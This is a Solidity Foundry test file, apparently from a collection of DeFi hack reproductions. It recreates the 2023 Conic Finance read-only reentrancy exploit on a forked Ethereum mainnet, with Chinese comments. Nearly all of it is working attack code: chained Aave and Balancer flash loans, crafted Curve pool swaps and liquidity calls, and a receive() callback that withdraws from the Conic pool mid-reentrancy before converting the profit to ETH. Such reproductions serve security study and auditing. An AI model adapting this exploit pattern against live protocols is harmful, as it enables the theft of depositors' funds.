// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~3.25M USD$
// Time : 2023-07-21
// Attacker : https://etherscan.io/address/0x8d67db0b205e32a5dd96145f022fa18aae7dc8aa
// Attack Contract : https://etherscan.io/address/0x743599ba5cfa3ce8c59691af5ef279aaafa2e4eb
// Vulnerable Contract : https://etherscan.io/address/0xbb787d6243a8d450659e09ea6fd82f1c859691e9
// Attack Tx : https://etherscan.io/tx/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146

// @Phalcon View : https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146

// @Analysis
// https://twitter.com/BlockSecTeam/status/1682346827939717120
// https://twitter.com/danielvf/status/1682496333540741121
// https://medium.com/@ConicFinance/post-mortem-eth-and-crvusd-omnipool-exploits-c9c7fa213a3d

// @Root Cause : Read-Only-Reentrancy

interface IConic {
    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);

    function handleDepeggedCurvePool(address curvePool_) external;

    function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
}

interface IWETH is WETH {
    function deposit() external payable;
}

contract Attacker is Test {
    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 cbETH_ETHf = IERC20(0x5b6C539b224014A09B3388e51CaAA8e354c959C8);
    IERC20 rETH_ETHf = IERC20(0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C);
    IERC20 cncETH = IERC20(0x3565A68666FD3A6361F06f84637E805b727b4A47);
    // 三家提供闪电贷服务的DEX
    IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloan AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IConic ConicPool = IConic(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
    address private constant lidoPool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address private constant vyperContract1 = 0x0f3159811670c117c372428D4E69AC32325e4D0F;
    address private constant vyperContract2 = 0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17740954);
        cheats.label(address(WETH), "WETH");
        cheats.label(address(rETH), "rETH");
        cheats.label(address(stETH), "stETH");
        cheats.label(address(cbETH), "cbETH");
        cheats.label(address(steCRV), "steCRV");
        cheats.label(address(cbETH_ETHf), "cbETH_ETHf");
        cheats.label(address(rETH_ETHf), "rETH_ETHf");
        cheats.label(address(cncETH), "cncETH");
        cheats.label(address(BalancerVault), "BalancerVault");
        cheats.label(address(AaveV2), "AaveV2");
        cheats.label(address(AaveV3), "AaveV3");
        cheats.label(address(ConicPool), "ConicPool");
        cheats.label(lidoPool, "Lido");
        cheats.label(vyperContract1, "vyperContract1");
        cheats.label(vyperContract2, "vyperContract2");
    }

    function testExploit() public {
        // 设置初始的ETH数量为0
        deal(address(this), 0 ether);
        // 记录攻击前Attacker的ETH余额
        emit log_named_decimal_uint("Attacker balance of ETH before exploit", address(this).balance, 18);

        WETH.approve(vyperContract1, type(uint256).max);
        rETH.approve(vyperContract1, type(uint256).max);
        WETH.approve(lidoPool, type(uint256).max);
        stETH.approve(lidoPool, type(uint256).max);
        WETH.approve(vyperContract2, type(uint256).max);
        cbETH.approve(vyperContract2, type(uint256).max);
        WETH.approve(address(ConicPool), type(uint256).max);
        cbETH.approve(address(AaveV3), type(uint256).max);
        stETH.approve(address(AaveV2), type(uint256).max);

        address[] memory assets = new address[](1);
        assets[0] = address(stETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 20_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        // 闪电贷1: AaveV2借 20k stETH
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        // 将手上的cbETH、stETH、rETH全部置换为WETH
        exchangeVyper(vyperContract2, cbETH.balanceOf(address(this)), 1, 0);
        exchangeLidoStETH();
        exchangeVyper(vyperContract1, rETH.balanceOf(address(this)), 1, 0);
        // 再换为ETH,跑路
        WETH.withdraw(WETH.balanceOf(address(this)));

        // 记录攻击后Attacker的ETH余额
        emit log_named_decimal_uint("Attacker balance of ETH after exploit", address(this).balance, 18);
    }

    // AaveV2的闪电贷回调函数
    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) external returns (bool) {
        // 闪电贷2: Aave3借 0.85k cbETH
        AaveV3.flashLoanSimple(address(this), address(cbETH), 850e18, bytes(""), 0);

        return true;
    }

    // AaveV3的闪电贷回调函数
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes memory params)
        external
        returns (bool)
    {
        address[] memory tokens = new address[](3);
        tokens[0] = address(rETH);
        tokens[1] = address(cbETH);
        tokens[2] = address(WETH);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 20_550 * 1e18;
        amounts[1] = 3_000 * 1e18;
        amounts[2] = 28_504_200 * 1e15;
        // 闪电贷3: Balancer借 20.55k rETH + 3k cbETH + 28.5042k WETH
        BalancerVault.flashLoan(address(this), tokens, amounts, bytes(""));

        return true;
    }

    // Balancer的闪电贷回调函数
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // 调用depositAndExchange(),向ConicPool中存入ETH,同时通过vyper合约置换rETH为WETH
        for (uint256 i; i < 7; i++) {
            depositAndExchange(121e18, 1, 0);
        }
        // 将20kWETH置换回ETH
        WETH.withdraw(20_000 * 1e18);
        addLiquidityToLido();
        removeLiquidityFromLido();
        // 剩下的留下4.2个WETH,其他全部置换为ETH
        WETH.withdraw(WETH.balanceOf(address(this)) - 4_200 * 1e15);
        interactWithVyperContract2();
        interactWithVyperContract1();
        exchangeVyper(vyperContract2, 850e18, 0, 1);
        // 从ConicPool中提取cncETH
        ConicPool.withdraw(cncETH.balanceOf(address(this)), 0);
        // 攻击合约地址全部的ETH置换为WETH
        WETH.deposit{value: address(this).balance}();
        exchangeVyper(vyperContract1, 1_100 * 1e18, 0, 1);
        // 又将300WETH换回了ETH
        WETH.withdraw(300e18);
        // 又换回了300WETH
        exchangeLidoWETH();
        // 分别还三家的闪电贷
        rETH.transfer(address(BalancerVault), 20_550 * 1e18);
        cbETH.transfer(address(BalancerVault), 3_000 * 1e18);
        WETH.transfer(address(BalancerVault), 28_504_200 * 1e15);
    }

    // 关键攻击逻辑
    receive() external payable {
        if (msg.sender == lidoPool && msg.value > 20_000 * 1e18) {
            ConicPool.handleDepeggedCurvePool(lidoPool);
        } else if (msg.sender == vyperContract2) {
            ConicPool.handleDepeggedCurvePool(vyperContract2);
        } else if (msg.sender == vyperContract1) {
            // !!!发动攻击
            // 之前与vyperContract1的频繁交互都是为了触发这个回调攻击
            ConicPool.withdraw(6_292_026 * 1e15, 0);
        }
    }

    function depositAndExchange(uint256 dx, uint256 i, uint256 j) internal {
        // 向ConicPool中存入ETH,并且拒绝提供流动性
        ConicPool.deposit(1_214 * 1e18, 0, false);
        // 向vyperContract2,vyperContract1置换rETH为WETH
        exchangeVyper(vyperContract2, dx, i, j);
        exchangeVyper(vyperContract1, dx, i, j);
    }

    function exchangeVyper(address contractAddr, uint256 dx, uint256 i, uint256 j) internal {
        // 函数选择器 bytes4(0xce7d6503) 对应 vyperContract 中的 exchange() 函数
        (bool success,) =
            contractAddr.call(abi.encodeWithSelector(bytes4(0xce7d6503), i, j, dx, 0, false, address(this)));
        require(success, "Exchange Vyper not successful");
    }

    // 用300ETH从Lido池子中置换出300WETH
    function exchangeLidoWETH() internal {
        // 函数选择器 bytes4(0x3df02124) 对应 Lido Pool 合约中的 exchange() 函数
        (bool success,) = lidoPool.call{value: 300 ether}(abi.encodeWithSelector(bytes4(0x3df02124), 0, 1, 300e18, 0));
        require(success, "Exchange Lido not successful");
    }

    function exchangeLidoStETH() internal {
        // 函数选择器 bytes4(0x3df02124) 对应 Lido Pool 合约中的 exchange() 函数
        (bool success,) =
            lidoPool.call(abi.encodeWithSelector(bytes4(0x3df02124), 1, 0, stETH.balanceOf(address(this)), 0));
        require(success, "Exchange Lido not successful");
    }

    // 向Lido池子添加20kETH以及剩余的所有stETH的流动性
    function addLiquidityToLido() internal {
        // 函数选择器 bytes4(0x0b4c7e4d) 对应 Lido Pool 合约中的 add_liquidity() 函数
        (bool success,) = lidoPool.call{value: 20000 ether}(
            abi.encodeWithSelector(bytes4(0x0b4c7e4d), [20_000 * 1e18, stETH.balanceOf(address(this))], 0)
        );
        require(success, "Add liquidity to Lido not successful");
    }

    function addLiquidityToVyperContract(address vyperContract, uint256 amount1, uint256 amount2) internal {
        // 函数选择器 bytes4(0x7328333b) 对应 vyperContract 中的 add_liquidity() 函数
        (bool success,) =
            vyperContract.call(abi.encodeWithSelector(bytes4(0x7328333b), [amount1, amount2], 0, false, address(this)));
        require(success, "Add liquidity to Vyper contract not successful");
    }

    // 从Lido池子中移除流动性
    function removeLiquidityFromLido() internal {
        // 函数选择器 bytes4(0x5b36389c) 对应 Lido Pool 合约中的 remove_liquidity() 函数
        (bool success,) =
            lidoPool.call(abi.encodeWithSelector(bytes4(0x5b36389c), steCRV.balanceOf(address(this)), [0, 0]));
        require(success, "Remove liquidity from Lido not successful");
    }

    function removeLiquidityFromVyperContract(address vyperContract, uint256 amount) internal {
        // 函数选择器 bytes4(0x1808e84a) 对应 vyperContract 中的 remove_liquidity() 函数
        (bool success,) =
            vyperContract.call(abi.encodeWithSelector(bytes4(0x1808e84a), amount, [0, 0], true, address(this)));
        require(success, "Remove liquidity from Vyper contract not successful");
    }

    function interactWithVyperContract1() internal {
        exchangeVyper(vyperContract1, rETH.balanceOf(address(this)), 1, 0);
        addLiquidityToVyperContract(vyperContract1, 2_400 * 1e15, 0);
        removeLiquidityFromVyperContract(vyperContract1, rETH_ETHf.balanceOf(address(this)));
        exchangeVyper(vyperContract1, 3_425_879_111_748_706_429_367, 0, 1);
    }

    function interactWithVyperContract2() internal {
        exchangeVyper(vyperContract2, cbETH.balanceOf(address(this)), 1, 0);
        addLiquidityToVyperContract(vyperContract2, 1_800 * 1e15, 0);
        removeLiquidityFromVyperContract(vyperContract2, cbETH_ETHf.balanceOf(address(this)));
        exchangeVyper(vyperContract2, WETH.balanceOf(address(this)) - 10e18, 0, 1);
    }
}
